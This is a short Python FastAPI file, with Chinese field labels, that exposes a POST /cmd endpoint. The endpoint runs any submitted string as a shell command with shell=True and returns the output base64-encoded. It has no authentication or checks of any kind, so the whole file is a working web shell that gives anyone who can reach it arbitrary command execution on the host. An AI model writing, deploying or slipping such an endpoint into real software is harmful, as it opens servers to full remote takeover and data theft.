from fastapi import FastAPI, Request
from pydantic import BaseModel, Field
import subprocess
import base64
from typing import Union
def system_cmd(cmd):
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout, stderr
class PostCMD(BaseModel):
    cmd: str = Field(title='执行的命令')
class ReturnCMD(BaseModel):
    cmd: str = Field(title='执行的命令')
    cmd_result: str = Field(title='执行的命令返回的结果, 已经被Base64编码')
class ERROR(BaseModel):
    error: str = Field(title='错误消息')
app = FastAPI()
@app.post("/cmd", response_model=Union[ReturnCMD, ERROR], summary='执行系统命令', description='执行系统命令描述')
async def cmd(postcmd: PostCMD, request: Request):
    exec_cmd = postcmd.cmd
    stdout, stderr = system_cmd(exec_cmd)
    if stderr:
        return ERROR(error=base64.b64encode(stderr).decode())
    return ReturnCMD(cmd=exec_cmd, cmd_result=base64.b64encode(stdout).decode())
